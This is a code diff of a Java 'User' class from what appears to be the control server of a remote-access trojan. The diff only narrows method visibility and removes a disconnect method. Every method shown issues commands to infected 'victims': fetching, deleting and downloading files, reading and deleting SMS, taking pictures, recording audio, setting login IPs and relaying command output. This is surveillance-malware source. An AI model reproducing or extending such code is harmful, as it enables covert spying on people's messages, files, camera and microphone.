@@ -12,16 +12,12 @@ public class User extends Client {
     private String token;
     private JSONObject dbData;
 
-    public User(ChannelHandlerContext context, JSONObject dbData) {
+    User(ChannelHandlerContext context, JSONObject dbData) {
         this.context = context;
         this.dbData = dbData;
         String login = (String) dbData.get("login");
         String password = (String) dbData.get("password");
         this.token = getHash(login + password + Config.SECRET_KEY);
-    }
-
-    public void disconnect() {
-        context.disconnect();
     }
 
     protected void sendMessage(JSONObject message) {
@@ -34,11 +30,11 @@ public class User extends Client {
         return dbData;
     }
 
-    public String getLogin() {
+    String getLogin() {
         return (String) dbData.get("login");
     }
 
-    public ArrayList<String> getVictims() {
+    ArrayList<String> getVictims() {
         return (ArrayList<String>) dbData.get("victims");
     }
 
@@ -46,7 +42,7 @@ public class User extends Client {
         return token;
     }
 
-    public boolean isValidToken(String token) {
+    boolean isValidToken(String token) {
         return token != null && token.equals(this.token);
     }
 
@@ -70,7 +66,7 @@ public class User extends Client {
         return sb.toString();
     }
 
-    public void sendGetFiles(JSONArray files, String victim) {
+    void sendGetFiles(JSONArray files, String victim) {
         JSONObject query = new JSONObject();
         query.put("action", "get.files");
         query.put("files", files);
@@ -78,21 +74,21 @@ public class User extends Client {
         sendMessage(query);
     }
 
-    public void sendAuthUser() {
+    void sendAuthUser() {
         JSONObject query = new JSONObject();
         query.put("action", "auth.user");
         query.put("token", token);
         sendMessage(query);
     }
 
-    public void sendGetVictims(JSONArray victims) {
+    void sendGetVictims(JSONArray victims) {
         JSONObject query = new JSONObject();
         query.put("action", "get.victims");
         query.put("victims", victims);
         sendMessage(query);
     }
 
-    public void sendDeleteFile(String code, String victim) {
+    void sendDeleteFile(String code, String victim) {
         JSONObject query = new JSONObject();
         query.put("action", "delete.file");
         query.put("code", code);
@@ -100,7 +96,7 @@ public class User extends Client {
         sendMessage(query);
     }
 
-    public void sendRenameFile(String code, String victim) {
+    void sendRenameFile(String code, String victim) {
         JSONObject query = new JSONObject();
         query.put("action", "rename.file");
         query.put("code", code);
@@ -108,7 +104,7 @@ public class User extends Client {
         sendMessage(query);
     }
 
-    public void sendMakeDir(String code, String victim) {
+    void sendMakeDir(String code, String victim) {
         JSONObject query = new JSONObject();
         query.put("action", "make.dir");
         query.put("code", code);
@@ -116,7 +112,7 @@ public class User extends Client {
         sendMessage(query);
     }
 
-    public void sendGetFileInfo(JSONObject info, String victim) {
+    void sendGetFileInfo(JSONObject info, String victim) {
         JSONObject query = new JSONObject();
         query.put("action", "get.file.info");
         query.put("info", info);
@@ -124,7 +120,7 @@ public class User extends Client {
         sendMessage(query);
     }
 
-    public void sendCopyFile(String code, String victim) {
+    void sendCopyFile(String code, String victim) {
         JSONObject query = new JSONObject();
         query.put("action", "copy.file");
         query.put("code", code);
@@ -132,7 +128,7 @@ public class User extends Client {
         sendMessage(query);
     }
 
-    public void sendSetVictimName(String code, String victim) {
+    void sendSetVictimName(String code, String victim) {
         JSONObject query = new JSONObject();
         query.put("action", "set.victim.name");
         query.put("code", code);
@@ -140,7 +136,7 @@ public class User extends Client {
         sendMessage(query);
     }
 
-    public void sendSetLoginIps(String code, String victim) {
+    void sendSetLoginIps(String code, String victim) {
         JSONObject query = new JSONObject();
         query.put("action", "set.login.ips");
         query.put("code", code);
@@ -148,7 +144,7 @@ public class User extends Client {
         sendMessage(query);
     }
 
-    public void sendGetSms(JSONArray sms, String type, String victim) {
+    void sendGetSms(JSONArray sms, String type, String victim) {
         JSONObject query = new JSONObject();
         query.put("action", "get.sms");
         query.put("sms", sms);
@@ -157,7 +153,7 @@ public class User extends Client {
         sendMessage(query);
     }
 
-    public void sendDeleteSms(String code, String victim) {
+    void sendDeleteSms(String code, String victim) {
         JSONObject query = new JSONObject();
         query.put("action", "delete.sms");
         query.put("code", code);
@@ -165,7 +161,7 @@ public class User extends Client {
         sendMessage(query);
     }
 
-    public void sendTakePicture(String code, String victim) {
+    void sendTakePicture(String code, String victim) {
         JSONObject query = new JSONObject();
         query.put("action", "take.picture");
         query.put("code", code);
@@ -173,7 +169,7 @@ public class User extends Client {
         sendMessage(query);
     }
 
-    public void sendStartAudioRecord(String code, String victim) {
+    void sendStartAudioRecord(String code, String victim) {
         JSONObject query = new JSONObject();
         query.put("action", "start.audio.record");
         query.put("code", code);
@@ -181,7 +177,7 @@ public class User extends Client {
         sendMessage(query);
     }
 
-    public void sendDownloadFile(String filename, long port, String victim) {
+    void sendDownloadFile(String filename, long port, String victim) {
         JSONObject query = new JSONObject();
         query.put("action", "download.file");
         query.put("filename", filename);
@@ -190,7 +186,7 @@ public class User extends Client {
         sendMessage(query);
     }
 
-    public void sendCmd(String out, String errorOut, String victim) {
+    void sendCmd(String out, String errorOut, String victim) {
         JSONObject query = new JSONObject();
         query.put("action", "cmd");
         query.put("out", out);
